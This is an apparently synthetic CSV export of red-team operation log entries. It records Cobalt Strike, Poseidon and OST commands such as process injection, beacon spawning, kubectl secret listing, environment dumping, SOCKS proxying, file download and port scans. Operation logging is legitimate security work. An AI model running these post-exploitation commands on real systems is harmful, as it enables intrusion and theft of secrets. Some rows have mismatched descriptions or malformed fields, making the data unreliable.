entry_identifier,start_date,end_date,source_ip,dest_ip,tool,user_context,command,description,output,comments,operator_name,extra_fields,oplog_id,tags
3942,2023-09-26 00:32:36,2024-04-23 14:25:56,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl can-i create pod,"PID 24662, Callback 22",Failed,Conducting container discovery,Manuel Chase,,,
3943,2024-04-01 22:55:44,2024-04-28 21:18:18,35.14.5.27,149.55.234.226,Cobalt Strike,afranklin@harrison.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Jerry Gonzalez,,,
3944,2024-02-16 06:32:59,2024-03-22 14:08:10,148.64.118.11,55.167.201.151,Poseidon,ipena@lane.com,pty ./kubectl get secrets,"PID 25998, Callback 68",Failed,Conducting container discovery,Jerry Gonzalez,,,
3945,2023-09-22 00:27:13,2023-11-12 08:09:21,148.64.118.11,149.55.234.226,OST,alopez@dawson.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Manuel Chase,,,
3946,2024-02-17 11:33:46,2024-02-29 09:31:41,35.14.5.27,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Success,Conducting container discovery,Jerry Gonzalez,,,
3947,2024-06-21 21:29:07,2024-06-21 21:29:07.332990,35.14.5.27,66.1.255.186,Cobalt Strike,alopez@dawson.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Alexander Kim,,,
3948,2024-06-24 02:04:10,2024-06-24 02:04:10.280780,148.64.118.11,55.167.201.151,OST,alopez@dawson.com,ls,PID: 13028,Failed,Listing files and directories,Manuel Chase,,,
3949,2023-12-28 00:47:56,2024-04-10 02:48:20,116.163.112.137,149.55.234.226,Cobalt Strike,afranklin@harrison.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Manuel Chase,,,
3950,2023-09-16 19:27:56,2024-02-05 19:44:56,116.163.112.137,149.55.234.226,Cobalt Strike,afranklin@harrison.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Manuel Chase,,,
3951,2023-11-29 18:46:18,2024-01-08 05:15:28,148.64.118.11,149.55.234.226,Cobalt Strike,alopez@dawson.com,spawn x64 HTTPS,PID 2061,Success,Spawning a new beacon,Jerry Gonzalez,,,
3952,2024-04-08 00:49:45,2024-05-01 12:33:11,90.201.27.188,55.167.201.151,OST,afranklin@harrison.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Alexander Kim,,,
3953,2024-05-01 00:26:27,2024-05-07 00:40:38,116.163.112.137,55.167.201.151,Cobalt Strike,alopez@dawson.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Manuel Chase,,,
3954,2023-07-21 09:49:05,2024-04-09 01:03:35,116.163.112.137,66.1.255.186,OST,ipena@lane.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Failed,Using BBOT safe and passive modules,Manuel Chase,,,
3955,2024-02-02 21:45:08,2024-04-16 09:30:38,148.64.118.11,66.1.255.186,OST,afranklin@harrison.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Alexander Kim,,,
3956,2023-11-07 09:49:11,2024-03-16 19:29:20,116.163.112.137,66.1.255.186,Poseidon,ipena@lane.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Manuel Chase,,,
3957,2024-01-14 01:31:48,2024-03-06 09:14:25,90.201.27.188,66.1.255.186,Cobalt Strike,ipena@lane.com,spawn x64 HTTPS,PID 2061,Success,Spawning a new beacon,Jerry Gonzalez,,,
3958,2023-09-18 00:45:46,2024-03-01 07:28:30,116.163.112.137,149.55.234.226,OST,afranklin@harrison.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Manuel Chase,,,
3959,2023-10-06 11:47:16,2024-02-07 13:52:40,148.64.118.11,55.167.201.151,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Manuel Chase,,,
3960,2024-02-02 04:38:55,2024-04-30 02:57:55,35.14.5.27,149.55.234.226,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Manuel Chase,,,
3961,2023-12-08 06:30:56,2024-04-25 18:00:28,116.163.112.137,55.167.201.151,Cobalt Strike,ipena@lane.com,pwd,PID 18794,Success,Obtaining current working directory,Jerry Gonzalez,,,
3962,2023-09-01 01:13:15,2024-02-02 01:00:15,35.14.5.27,55.167.201.151,Poseidon,ipena@lane.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Jerry Gonzalez,,,
3963,2024-04-12 20:21:29,2024-04-25 18:15:16,148.64.118.11,149.55.234.226,Cobalt Strike,afranklin@harrison.com,inject-assembly 10023 /during/window.exe,PID 29523,Failed,Injecting assembly into a process,Alexander Kim,,,
3964,2023-12-27 21:43:01,2024-03-17 10:07:30,116.163.112.137,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Alexander Kim,,,
3965,2023-11-20 13:33:29,2024-03-27 13:27:28,116.163.112.137,55.167.201.151,OST,ipena@lane.com,ls,PID: 13028,Success,Listing files and directories,Manuel Chase,,,
3966,2024-02-23 23:21:16,2024-04-06 19:29:25,35.14.5.27,149.55.234.226,Cobalt Strike,alopez@dawson.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Jerry Gonzalez,,,
3967,2023-09-24 20:06:11,2024-02-11 09:26:39,90.201.27.188,149.55.234.226,Poseidon,ipena@lane.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Failed,Conducting container discovery,Jerry Gonzalez,,,
3968,2024-06-29 16:41:36,2024-06-29 16:41:36.721893,35.14.5.27,149.55.234.226,Poseidon,afranklin@harrison.com,getenv,"PID 18369, Callback 13",Success,Attempting to get environment variables,Manuel Chase,,,
3969,2024-06-10 14:09:26,2024-06-10 14:09:26.521655,116.163.112.137,55.167.201.151,Cobalt Strike,afranklin@harrison.com,pwd,PID 18794,Failed,Obtaining current working directory,Jerry Gonzalez,,,
3970,2023-10-31 10:47:56,2024-01-25 02:59:11,148.64.118.11,55.167.201.151,OST,afranklin@harrison.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Jerry Gonzalez,,,
3971,2023-10-09 00:34:07,2023-10-17 16:09:50,35.14.5.27,66.1.255.186,Poseidon,ipena@lane.com,getenv,"PID 18369, Callback 13",Success,Attempting to get environment variables,Alexander Kim,,,
3972,2023-09-02 04:47:43,2024-03-16 18:28:59,35.14.5.27,66.1.255.186,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Alexander Kim,,,
3973,2023-08-12 01:11:39,2023-12-05 12:32:09,35.14.5.27,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Jerry Gonzalez,,,
3974,2024-02-22 16:51:06,2024-05-10 03:22:03,90.201.27.188,55.167.201.151,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Jerry Gonzalez,,,
3975,2023-10-11 21:48:42,2023-10-22 22:38:46,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Manuel Chase,,,
3976,2024-02-09 17:02:58,2024-03-30 09:57:05,148.64.118.11,149.55.234.226,Poseidon,afranklin@harrison.com,pty whoami,"PID 31096, Callback 44",Failed,Obtaining user context,Jerry Gonzalez,,,
3977,2024-05-03 09:06:49,2024-05-04 15:52:52,116.163.112.137,149.55.234.226,Poseidon,ipena@lane.com,pty kubectl get namespaces,"PID 4839, Callback 49",Success,Conducting container discovery,Jerry Gonzalez,,,
3978,2024-02-27 13:38:55,2024-03-22 01:35:04,90.201.27.188,66.1.255.186,Cobalt Strike,alopez@dawson.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Manuel Chase,,,
3979,2024-06-14 05:57:55,2024-06-14 05:57:55.527947,35.14.5.27,66.1.255.186,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Jerry Gonzalez,,,
3980,2023-08-21 20:54:08,2024-01-24 05:05:30,116.163.112.137,55.167.201.151,Poseidon,afranklin@harrison.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Alexander Kim,,,
3981,2023-10-11 11:35:52,2024-04-22 08:51:53,90.201.27.188,55.167.201.151,Cobalt Strike,ipena@lane.com,shinject 12473 x64 /growth.bin,PID 31000,Success,Attempting process injection,Manuel Chase,,,
3982,2024-02-22 10:05:12,2024-03-05 00:41:09,116.163.112.137,55.167.201.151,Poseidon,alopez@dawson.com,pty ./kubectl get namespaces -n cluster,"PID 29432, Callback 20",Success,Conducting container discovery,Alexander Kim,,,
3983,2024-02-07 12:57:01,2024-05-07 21:36:42,116.163.112.137,66.1.255.186,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Failed,Sleeping a beacon,Jerry Gonzalez,,,
3984,2023-12-16 01:57:46,2024-03-29 23:42:04,90.201.27.188,66.1.255.186,Cobalt Strike,ipena@lane.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Manuel Chase,,,
3985,2024-05-10 20:02:47,2024-05-11 01:42:34,148.64.118.11,149.55.234.226,Cobalt Strike,alopez@dawson.com,sleep 7,PID 3213,Success,Sleeping a beacon,Jerry Gonzalez,,,
3986,2023-11-08 15:30:22,2023-12-25 21:34:18,116.163.112.137,66.1.255.186,Poseidon,alopez@dawson.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Alexander Kim,,,
3987,2024-06-03 02:06:21,2024-06-03 02:06:21.333279,148.64.118.11,149.55.234.226,Cobalt Strike,alopez@dawson.com,inject-assembly 10023 /during/window.exe,PID 29523,Failed,Injecting assembly into a process,Manuel Chase,,,
3988,2024-05-28 10:04:06,2024-05-28 10:04:06.374471,35.14.5.27,66.1.255.186,OST,ipena@lane.com,sleep 3,PID: 8087,Success,Sleeping a beacon,Jerry Gonzalez,,,
3989,2023-07-31 23:30:33,2023-10-04 15:14:07,148.64.118.11,55.167.201.151,Poseidon,afranklin@harrison.com,sleep 19,"PID 2266, Callback 86",Success,Sleeping a beacon,Jerry Gonzalez,,,
3990,2023-11-28 17:34:16,2024-04-21 15:22:37,116.163.112.137,55.167.201.151,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Success,Attempting a file upload,Alexander Kim,,,
3991,2023-10-31 03:27:47,2024-03-22 08:30:21,148.64.118.11,149.55.234.226,OST,ipena@lane.com,download /Congress/fund.docx,PID: 5215,Success,Downloading a file,Jerry Gonzalez,,,
3992,2023-08-06 17:12:42,2023-10-27 09:02:32,148.64.118.11,149.55.234.226,Poseidon,alopez@dawson.com,getenv,"PID 18369, Callback 13",Success,Attempting to get environment variables,Jerry Gonzalez,,,
3993,2024-02-23 01:02:28,2024-04-23 16:17:13,116.163.112.137,149.55.234.226,Cobalt Strike,afranklin@harrison.com,execute-assembly /pick/occur.exe,PID 10850,Failed,Running a local .NET executable,Jerry Gonzalez,,,
3994,2023-12-15 15:35:46,2024-02-07 10:52:54,148.64.118.11,55.167.201.151,OST,ipena@lane.com,bbot -t bowman.com-f safe -ef passive,PID: 20292,Success,Using BBOT safe and passive modules,Alexander Kim,,,
3995,2024-06-22 00:40:44,2024-06-22 00:40:44.399920,35.14.5.27,55.167.201.151,Poseidon,alopez@dawson.com,pty whoami,"PID 31096, Callback 44",Failed,Obtaining user context,Jerry Gonzalez,,,
3996,2024-02-02 08:17:02,2024-04-28 17:05:57,148.64.118.11,55.167.201.151,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Alexander Kim,,,
3997,2023-08-03 13:52:03,2024-04-14 22:23:48,35.14.5.27,149.55.234.226,OST,alopez@dawson.com,python3 CloudScraper.py -u thomas.com >> /build/add.txt,PID: 3148,Success,Navigating to a directory,Manuel Chase,,,
3998,2023-07-23 08:46:03,2023-08-21 09:52:29,116.163.112.137,55.167.201.151,Poseidon,ipena@lane.com,getenv,"PID 18369, Callback 13",Failed,Attempting to get environment variables,Manuel Chase,,,
3999,2023-09-29 10:31:40,2024-02-04 10:13:08,116.163.112.137,55.167.201.151,Cobalt Strike,afranklin@harrison.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Jerry Gonzalez,,,
4000,2023-10-11 00:51:58,2024-03-16 20:44:35,35.14.5.27,149.55.234.226,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Jerry Gonzalez,,,
4001,2024-02-03 18:30:40,2024-03-27 11:28:33,90.201.27.188,55.167.201.151,Cobalt Strike,ipena@lane.com,upload /first/so.html,PID 20381,Failed,Attempting a file upload,Manuel Chase,,,
4002,2023-09-08 07:14:45,2023-12-08 13:36:33,35.14.5.27,66.1.255.186,OST,afranklin@harrison.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Jerry Gonzalez,,,
4003,2023-10-16 17:57:01,2024-05-05 16:32:14,35.14.5.27,149.55.234.226,OST,afranklin@harrison.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Manuel Chase,,,
4004,2024-03-12 20:48:24,2024-03-16 22:36:16,90.201.27.188,66.1.255.186,Poseidon,alopez@dawson.com,pty kubectl get namespaces,"PID 4839, Callback 49",Success,Conducting container discovery,Alexander Kim,,,
4005,2023-10-25 00:32:04,2023-12-20 17:37:09,116.163.112.137,66.1.255.186,Poseidon,alopez@dawson.com,getenv,"PID 18369, Callback 13",Success,Attempting to get environment variables,Manuel Chase,,,
4006,2024-03-02 21:44:40,2024-03-24 21:29:06,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Manuel Chase,,,
4007,2023-11-23 01:02:10,2024-02-18 19:27:28,35.14.5.27,66.1.255.186,Cobalt Strike,afranklin@harrison.com,pwd,PID 18794,Failed,Obtaining current working directory,Alexander Kim,,,
4008,2024-06-13 20:53:06,2024-06-13 20:53:06.797472,116.163.112.137,66.1.255.186,Cobalt Strike,alopez@dawson.com,shinject 12473 x64 /growth.bin,PID 31000,Failed,Attempting process injection,Alexander Kim,,,
4009,2023-12-30 19:46:40,2024-03-11 19:13:30,148.64.118.11,55.167.201.151,Cobalt Strike,afranklin@harrison.com,sleep 7,PID 3213,Success,Sleeping a beacon,Alexander Kim,,,
4010,2024-04-14 03:04:15,2024-04-16 02:51:22,148.64.118.11,55.167.201.151,OST,ipena@lane.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Manuel Chase,,,
4011,2023-08-24 14:12:00,2023-11-29 04:37:30,35.14.5.27,149.55.234.226,Cobalt Strike,ipena@lane.com,spawn x64 HTTPS,PID 2061,Success,Spawning a new beacon,Jerry Gonzalez,,,
4012,2024-02-27 22:37:32,2024-04-18 15:43:40,116.163.112.137,149.55.234.226,Cobalt Strike,alopez@dawson.com,spawn x64 HTTPS,PID 2061,Failed,Spawning a new beacon,Alexander Kim,,,
4013,2023-08-16 23:53:54,2024-01-09 00:55:26,90.201.27.188,55.167.201.151,OST,ipena@lane.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Jerry Gonzalez,,,
4014,2023-10-26 01:08:26,2024-04-28 01:53:53,116.163.112.137,149.55.234.226,OST,afranklin@harrison.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Jerry Gonzalez,,,
4015,2023-07-19 01:00:13,2024-04-19 10:05:44,116.163.112.137,66.1.255.186,Cobalt Strike,ipena@lane.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Jerry Gonzalez,,,
4016,2023-08-02 09:39:42,2023-11-11 19:07:32,116.163.112.137,66.1.255.186,Cobalt Strike,ipena@lane.com,inject-assembly 10023 /during/window.exe,PID 29523,Success,Injecting assembly into a process,Manuel Chase,,,
4017,2024-07-01 15:42:52,2024-07-01 15:42:52.385042,90.201.27.188,149.55.234.226,Poseidon,ipena@lane.com,pty whoami,"PID 31096, Callback 44",Success,Obtaining user context,Jerry Gonzalez,,,
4018,2024-04-11 15:32:14,2024-04-23 05:13:21,35.14.5.27,149.55.234.226,Cobalt Strike,ipena@lane.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Jerry Gonzalez,,,
4019,2024-03-03 06:54:08,2024-04-19 10:33:16,116.163.112.137,66.1.255.186,OST,alopez@dawson.com,sleep 3,PID: 8087,Failed,Sleeping a beacon,Manuel Chase,,,
4020,2024-03-12 23:12:22,2024-03-21 17:06:01,90.201.27.188,149.55.234.226,Cobalt Strike,afranklin@harrison.com,inject-assembly 10023 /during/window.exe,PID 29523,Success,Injecting assembly into a process,Alexander Kim,,,
4021,2023-11-08 13:14:34,2024-02-03 18:11:32,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Manuel Chase,,,
4022,2023-10-08 05:35:42,2023-12-02 08:08:09,148.64.118.11,149.55.234.226,OST,afranklin@harrison.com,ls,PID: 13028,Success,Listing files and directories,Jerry Gonzalez,,,
4023,2023-08-09 04:09:26,2024-02-24 18:40:41,116.163.112.137,55.167.201.151,Poseidon,afranklin@harrison.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
4024,2024-02-17 05:25:22,2024-03-08 23:35:08,90.201.27.188,149.55.234.226,Cobalt Strike,afranklin@harrison.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Jerry Gonzalez,,,
4025,2024-06-14 15:20:45,2024-06-14 15:20:45.828001,35.14.5.27,66.1.255.186,Cobalt Strike,afranklin@harrison.com,cd /policy/fear/yourself,PID 14828,Failed,Navigating to a directory,Manuel Chase,,,
4026,2024-05-14 15:10:54,2024-05-14 15:10:54.648979,116.163.112.137,55.167.201.151,Cobalt Strike,alopez@dawson.com,spawn x64 HTTPS,PID 2061,Failed,Spawning a new beacon,Alexander Kim,,,
4027,2023-11-08 09:04:38,2023-12-08 14:01:54,90.201.27.188,55.167.201.151,OST,afranklin@harrison.com,ls,PID: 13028,Failed,Listing files and directories,Jerry Gonzalez,,,
4028,2024-02-15 04:38:50,2024-04-30 19:37:23,116.163.112.137,55.167.201.151,Cobalt Strike,alopez@dawson.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Failed,Selecting executable for post-exploitation jobs,Jerry Gonzalez,,,
4029,2024-02-17 18:37:57,2024-04-03 03:35:07,148.64.118.11,55.167.201.151,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Failed,Navigating to a directory,Alexander Kim,,,
4030,2024-02-06 20:37:46,2024-04-09 08:45:55,90.201.27.188,66.1.255.186,Poseidon,afranklin@harrison.com,pty ./kubectl get pods,"PID 2804, Callback 6",Failed,Conducting container discovery,Alexander Kim,,,
4031,2023-10-05 18:28:17,2024-02-15 02:56:36,90.201.27.188,66.1.255.186,Poseidon,afranklin@harrison.com,"socks {""action"":""start"",""port"":43562}","PID 352, Callback 31",Failed,Attempting to start a SOCKS proxy,Jerry Gonzalez,,,
4032,2024-04-14 07:01:02,2024-05-08 19:19:11,35.14.5.27,55.167.201.151,OST,alopez@dawson.com,bbot -t stephens.com-m nmap,PID: 22204,Failed,Using BBOT port scan,Manuel Chase,,,
4033,2023-12-30 15:25:28,2024-04-11 10:17:38,116.163.112.137,149.55.234.226,Poseidon,afranklin@harrison.com,"upload {""file_id"":""08e79d0c-a8bf-4aa4-9263-383cf434e398"",""remote_path""/night/any.gif"",""overwrite"":false}","PID 15761, Callback 54",Success,Attempting to upload a file,Alexander Kim,,,
4034,2024-01-21 12:19:43,2024-03-28 03:03:04,35.14.5.27,66.1.255.186,Cobalt Strike,alopez@dawson.com,shinject 12473 x64 /growth.bin,PID 31000,Success,Attempting process injection,Alexander Kim,,,
4035,2024-03-22 22:45:06,2024-04-09 08:33:59,148.64.118.11,66.1.255.186,Poseidon,ipena@lane.com,sleep 19,"PID 2266, Callback 86",Failed,Sleeping a beacon,Alexander Kim,,,
4036,2023-10-01 01:23:35,2024-05-04 03:50:15,90.201.27.188,149.55.234.226,Cobalt Strike,alopez@dawson.com,spawnto x64 /glass/involve/speak/kind.docx,PID 14588,Success,Selecting executable for post-exploitation jobs,Manuel Chase,,,
4037,2023-11-17 22:53:50,2024-04-07 10:02:33,116.163.112.137,55.167.201.151,Poseidon,ipena@lane.com,pty curl,"PID 5852, Callback 25",Success,Attempting to use cURL,Alexander Kim,,,
4038,2024-04-24 08:50:14,2024-05-02 07:44:25,148.64.118.11,66.1.255.186,OST,afranklin@harrison.com,download /Congress/fund.docx,PID: 5215,Failed,Downloading a file,Jerry Gonzalez,,,
4039,2024-04-23 01:14:44,2024-05-04 13:35:31,148.64.118.11,55.167.201.151,Cobalt Strike,ipena@lane.com,inject-assembly 10023 /during/window.exe,PID 29523,Success,Injecting assembly into a process,Manuel Chase,,,
4040,2023-08-11 20:17:55,2024-01-05 12:22:59,35.14.5.27,66.1.255.186,Cobalt Strike,ipena@lane.com,execute-assembly /pick/occur.exe,PID 10850,Success,Running a local .NET executable,Alexander Kim,,,
4041,2024-04-23 17:00:34,2024-05-08 23:45:14,148.64.118.11,149.55.234.226,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Alexander Kim,,,
4042,2024-07-01 08:23:01,2024-07-01 08:23:01.934140,116.163.112.137,149.55.234.226,OST,alopez@dawson.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Alexander Kim,,,
4043,2024-06-27 20:59:36,2024-06-27 20:59:36.453231,116.163.112.137,55.167.201.151,OST,ipena@lane.com,bbot -t stephens.com-m nmap,PID: 22204,Success,Using BBOT port scan,Jerry Gonzalez,,,
4044,2024-03-10 12:32:45,2024-04-03 04:44:43,35.14.5.27,55.167.201.151,OST,afranklin@harrison.com,cd /central/own/Congress,PID: 8994,Success,Navigating to a directory,Manuel Chase,,,
4045,2023-08-31 02:30:04,2024-03-16 23:30:12,116.163.112.137,55.167.201.151,Poseidon,ipena@lane.com,pty ./kubectl get pods,"PID 2804, Callback 6",Success,Conducting container discovery,Manuel Chase,,,
